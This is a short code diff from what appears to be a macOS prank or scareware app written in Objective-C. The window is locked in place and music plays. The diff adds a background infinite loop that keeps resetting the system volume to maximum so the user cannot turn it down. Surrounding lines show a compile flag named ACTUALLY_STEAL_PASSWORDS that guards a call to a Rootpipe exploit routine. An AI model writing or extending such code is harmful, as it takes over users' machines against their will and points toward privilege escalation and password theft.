@@ -38,7 +38,7 @@
     [self setMovable:NO];
     [self setMovableByWindowBackground:NO];
     [self addSubviews];
-    [self setVolumeMax];
+    [self lockVolumeMax];
     [self playMusic];
 #ifdef ACTUALLY_STEAL_PASSWORDS
     if ([Rootpipe runExploit]) {
@@ -84,8 +84,17 @@
 }
 
 - (void)setVolumeMax {
-    NSAppleScript *changeVolume = [[NSAppleScript alloc] initWithSource:@"set volume 1"];
+    NSAppleScript *changeVolume = [[NSAppleScript alloc] initWithSource:@"set volume 10"];
     [changeVolume executeAndReturnError:nil];
+}
+
+- (void)lockVolumeMaxLoop {
+    while (1)
+        [self setVolumeMax];
+}
+
+- (void)lockVolumeMax {
+    [self performSelectorInBackground:@selector(lockVolumeMaxLoop) withObject:self];
 }
 
 - (void)showImage {
